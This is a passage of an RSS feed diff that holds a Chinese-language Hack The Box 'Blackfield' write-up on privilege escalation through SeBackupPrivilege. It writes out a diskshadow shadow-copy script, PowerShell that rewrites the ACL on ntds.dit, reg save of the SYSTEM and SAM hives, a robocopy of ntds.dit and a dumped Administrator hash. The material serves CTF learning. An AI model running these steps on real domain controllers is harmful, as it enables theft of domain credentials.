+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742995743126-468132d3-7c96-4f57-8c37-f4b0d14f5e18_hu74756b240d97a5efc16e12e91523c7fc_33304_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742995743126-468132d3-7c96-4f57-8c37-f4b0d14f5e18_hu74756b240d97a5efc16e12e91523c7fc_33304_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;389&#34;
+		data-flex-basis=&#34;934px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;有了hash而且有CanPSRmote可以用evil登陆尝试一下了9658d1d1dcd9250115e2205d9f48400d&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742995849842-74cf7e24-0faf-4316-85e2-03817ef81e4b.png&#34;
+	width=&#34;1057&#34;
+	height=&#34;427&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1742995849842-74cf7e24-0faf-4316-85e2-03817ef81e4b_hu1042a2aa174d66e8f4d6ae7b90d0943e_88537_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1742995849842-74cf7e24-0faf-4316-85e2-03817ef81e4b_hu1042a2aa174d66e8f4d6ae7b90d0943e_88537_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;247&#34;
+		data-flex-basis=&#34;594px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;嗯，进来了&lt;/p&gt;
+&lt;p&gt;之后whoami /priv查看特权&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1743148236140-cc9f35d9-d618-4bca-9b30-f0fbbe78730b.png&#34;
+	width=&#34;844&#34;
+	height=&#34;332&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1743148236140-cc9f35d9-d618-4bca-9b30-f0fbbe78730b_hu850b9285cb155fcaf7c187c11b3c5d4b_126786_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1743148236140-cc9f35d9-d618-4bca-9b30-f0fbbe78730b_hu850b9285cb155fcaf7c187c11b3c5d4b_126786_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;254&#34;
+		data-flex-basis=&#34;610px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;特殊点在这，SeBackupPrivilege&lt;/p&gt;
+&lt;p&gt;我们拥有这个权限&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;SeBackupPrivilege 特权允许用户对系统中的大部分文件进行备份，哪怕文件的访问控制列表（ACL）并未赋予该用户这种访问权限。因此，攻击者可以通过 SeBackupPrivilege 特权备份整个系统盘，从而直接从创建的备份卷中访问任何文件。&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;根据**&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;SeBackupPrivilege利用流程走&lt;/font&gt;**&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;1.建立 shadowscript.txt  文件&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set context persistent nowriters#
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;add volume c: alias binsec#
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;create#
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;expose %binsec% z:#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;之后将该文件上传到 C:.enum  目录下（自行建立）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;2修改使用者权限 利用 ACL-object让账号用有&lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:rgb(51, 51, 51);&amp;quot;&amp;gt;C:\Windows\NTDS\ntds.dit&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;的存取權权&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$NTDS = &amp;#34;C:\Windows\NTDS\ntds.dit&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$acl = Get-Acl $NTDS
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(&amp;#34;blackfield.local\svc_backup&amp;#34;,&amp;#34;FullControl&amp;#34;,&amp;#34;Allow&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$acl.SetAccessRule($AccessRule)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$acl | Set-Acl $NTDS
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;使用完后检查&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1743150088636-6cf7a4bf-5943-4b60-a34d-7100f2b23ae1.png&#34;
+	width=&#34;815&#34;
+	height=&#34;95&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1743150088636-6cf7a4bf-5943-4b60-a34d-7100f2b23ae1_hu61a6ae6b3d06643f8c1915d0c956a657_23857_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1743150088636-6cf7a4bf-5943-4b60-a34d-7100f2b23ae1_hu61a6ae6b3d06643f8c1915d0c956a657_23857_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;857&#34;
+		data-flex-basis=&#34;2058px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;3执行diskshadow.exe&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;diskshadow.exe /s C:.enum\shadowscript.txt&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;只后抓取俩个重要文件&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg save HKLM\SYSTEM SYSTEM.SAV
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg save HKLM\SAM SAM.SAV（域不需要）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;现在当前目录下就有了&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1743150355929-af3ff2ac-c575-4497-83e1-f413da26b251.png&#34;
+	width=&#34;861&#34;
+	height=&#34;306&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1743150355929-af3ff2ac-c575-4497-83e1-f413da26b251_hud8a25d772731c33f488e214015c0f25f_36231_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1743150355929-af3ff2ac-c575-4497-83e1-f413da26b251_hud8a25d772731c33f488e214015c0f25f_36231_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;281&#34;
+		data-flex-basis=&#34;675px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;再copy一下ntds.dit&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;robocopy /b Z:\Windows\NTDS C:\Users\Public ntds.dit&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;之后传回爆破&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1743155209612-7856d91f-8367-4be4-bd66-74acafccc2b0.png&#34;
+	width=&#34;1198&#34;
+	height=&#34;386&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/blackfield/1743155209612-7856d91f-8367-4be4-bd66-74acafccc2b0_huc46a0c9d667e2b645fc9d46202d127ed_224175_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/blackfield/1743155209612-7856d91f-8367-4be4-bd66-74acafccc2b0_huc46a0c9d667e2b645fc9d46202d127ed_224175_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;310&#34;
+		data-flex-basis=&#34;744px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Sauna</title>
         <link>https://nergigantes.github.io/htb/sauna/</link>
         <pubDate>Sat, 22 Mar 2025 19:05:53 +0800</pubDate>
